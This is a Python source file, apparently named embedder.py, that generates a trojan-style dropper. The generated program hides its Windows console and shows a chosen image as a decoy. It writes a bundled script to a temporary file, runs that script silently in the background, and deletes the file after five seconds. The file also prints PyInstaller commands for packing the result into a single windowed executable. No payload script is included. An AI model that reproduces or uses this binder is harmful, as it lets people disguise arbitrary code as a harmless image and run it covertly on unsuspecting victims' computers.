import sys
import os
import base64
import io
import threading
import tempfile
import json
from PIL import Image, ImageTk
import tkinter as tk
from tkinter import ttk

class EmbeddedApp:
    def __init__(self, image_data, script_code):
        self.image_data = image_data
        self.script_code = script_code

    def show_image(self):
        try:
            img_bytes = base64.b64decode(self.image_data)
            img = Image.open(io.BytesIO(img_bytes))
            
            self.root = tk.Tk()
            self.root.title("Application")
            
            tk_image = ImageTk.PhotoImage(img)
            label = ttk.Label(self.root, image=tk_image)
            label.image = tk_image
            label.pack()
            
            status = ttk.Label(self.root, text="Background process running...", padding=10)
            status.pack()
            
            self.root.mainloop()
        except Exception as e:
            print(f"Image display error: {e}")

    def run_script(self):
        try:
            with tempfile.NamedTemporaryFile(suffix='.py', delete=False, mode='w') as f:
                f.write(self.script_code)
                temp_path = f.name
            
            if sys.platform == 'win32':
                os.system(f'start /B python "{temp_path}"')
            else:
                os.system(f'python "{temp_path}" &')
            
            threading.Timer(5, lambda: os.unlink(temp_path)).start()
        except Exception as e:
            print(f"Script execution error: {e}")

def create_embedded_app(image_path, script_path, output_name="embedded_app"):
    try:
        with open(image_path, 'rb') as img_file:
            raw_img_data = base64.b64encode(img_file.read()).decode('utf-8')
            img_data = json.dumps(raw_img_data)

        with open(script_path, 'r', encoding='utf-8') as script_file:
            script_code = json.dumps(script_file.read())

        
        app_code = f"""import sys
import os
import base64
import io
import threading
import tempfile
from PIL import Image, ImageTk
import tkinter as tk
from tkinter import ttk

# Hide console window on Windows
if sys.platform == "win32":
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
image_data = {img_data}
script_code = {script_code}



class EmbeddedApp:
    def __init__(self, image_data, script_code):
        self.image_data = image_data
        self.script_code = script_code

    def show_image(self):
        try:
            img_bytes = base64.b64decode(self.image_data)
            img = Image.open(io.BytesIO(img_bytes))
            img = img.resize((400, 300), Image.LANCZOS)  # Resize to desired dimensions
            
            self.root = tk.Tk()
            self.root.title("img")
            
            tk_image = ImageTk.PhotoImage(img)
            label = ttk.Label(self.root, image=tk_image)
            label.image = tk_image
            label.pack()
            
            status = ttk.Label(self.root, padding=10)
            status.pack()
            
            self.root.mainloop()
        except Exception as e:
            print(f"Image display error: {{e}}")

    def run_script(self):
        try:
            with tempfile.NamedTemporaryFile(suffix='.py', delete=False, mode='w') as f:
                f.write(self.script_code)
                temp_path = f.name
            
            if sys.platform == 'win32':
                os.system(f'start /B python "{{temp_path}}"')
            else:
                os.system(f'python "{{temp_path}}" &')
            
            threading.Timer(5, lambda: os.unlink(temp_path)).start()
        except Exception as e:
            print(f"Script execution error: {{e}}")

if __name__ == '__main__':
    app = EmbeddedApp(image_data, script_code)
    gui_thread = threading.Thread(target=app.show_image, daemon=True)
    script_thread = threading.Thread(target=app.run_script, daemon=True)
    gui_thread.start()
    script_thread.start()
    gui_thread.join()
    script_thread.join()
"""
        output_script = f"{output_name}.py"
        with open(output_script, 'w', encoding='utf-8') as f:
            f.write(app_code)
        
        print(f"Successfully created: {output_script}")
        print(f"\nTo build executable:\n1. pip install pyinstaller")
        print(f"2. pyinstaller --onefile --windowed --name {output_name} {output_script}")
        
    except Exception as e:
        print(f"Error creating application: {e}")

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print("Usage: python embedder.py <image_path> <script_path> <output_name>")
        print("Example: python embedder.py image.png script.py MyApp")
        sys.exit(1)
    
    create_embedded_app(sys.argv[1], sys.argv[2], sys.argv[3])